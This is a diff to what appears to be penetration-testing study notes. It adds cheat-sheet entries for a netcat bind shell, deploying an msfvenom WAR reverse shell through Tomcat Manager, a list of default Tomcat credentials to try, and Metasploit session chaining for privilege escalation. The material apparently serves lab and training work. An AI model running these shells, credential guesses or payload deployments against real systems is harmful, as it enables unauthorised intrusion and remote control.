@@ -43,4 +43,63 @@ Part of [[DECISION TREE]]. "I found X, what do I try" for reverse shells and she
 → Mechanics of why staged payloads need a handler: [[Antivirus Evasion (Breakdowns)#Staged vs stageless payloads|Command Breakdowns]]
 → Seen live: [[Antivirus Evasion#15.3.3. Shellter + Spotify Hands-On|Antivirus Evasion, 15.3.3]]
 
-#### Tags: #AntivirusEvasion #Shellter #StagedPayload #PowerShellInjection #MultiHandler
+---
+
+### Reverse shell won't connect back — target is behind NAT or strict egress filtering
+
+→ Switch to a **bind shell**: you open a listener on the TARGET and connect TO it from Kali, so no outbound traffic from the target required.
+
+Linux bind shell (mkfifo — no nc -e required):
+```bash
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 4444 > /tmp/f
+```
+Then from Kali: `nc <target-ip> 4444`
+
+→ Bind shells require the target port to be reachable from Kali (i.e. inbound filtering must allow it). If that's also blocked, you're stuck: reverse shell through allowed egress ports (80/443) is the only escape.
+→ MSF `multi/handler` can also catch bind: `set payload linux/x86/shell/bind_tcp` + `set RHOST <target>` + `run`
+→ Full reference: [[Shells & Payloads#Bind shells|Command Appendix]]
+
+---
+
+### Found Tomcat Manager App accessible (or have Tomcat credentials)
+
+→ Deploy a **WAR reverse shell**:
+```bash
+# 1. Generate the WAR payload
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<kali-ip> LPORT=4444 -f war -o shell.war
+
+# 2. Upload via Manager App web UI (http://target:8080/manager/html → Deploy WAR)
+# OR via curl:
+curl -u admin:password -T shell.war http://target:8080/manager/deploy?path=/shell
+
+# 3. Start listener
+nc -nvlp 4444
+
+# 4. Trigger
+curl http://target:8080/shell/
+```
+→ Default Tomcat Manager credentials to try: `admin:admin`, `tomcat:tomcat`, `tomcat:s3cret`, `admin:s3cret`
+→ Full reference: [[Attacking Common Services (HTB Supplementary)#CS.11 Tomcat WAR Shell Deployment|CS.11]], [[Shells & Payloads#Tomcat WAR|Command Appendix]]
+
+---
+
+### Got a Metasploit session but need to run a local privilege escalation module on top of it
+
+→ Use **session chaining** — background the current session, run the local exploit with `SESSION` pointing at it:
+```
+# In msfconsole:
+background          # or Ctrl-Z
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+# Once you pick an exploit:
+use exploit/windows/local/cve_2023_29360_truesight
+set SESSION 1
+run
+```
+→ `sessions -l` lists open sessions; `sessions -i <N>` reconnects; `sessions -k <N>` kills one.
+→ `setg LHOST <kali-ip>` sets LHOST globally so you don't need to retype it per module.
+→ Full reference: [[Shells & Payloads#MSF Session Management|Command Appendix]]
+
+#### Tags: #AntivirusEvasion #Shellter #StagedPayload #PowerShellInjection #MultiHandler #BindShell #Tomcat #MSF #SessionChaining
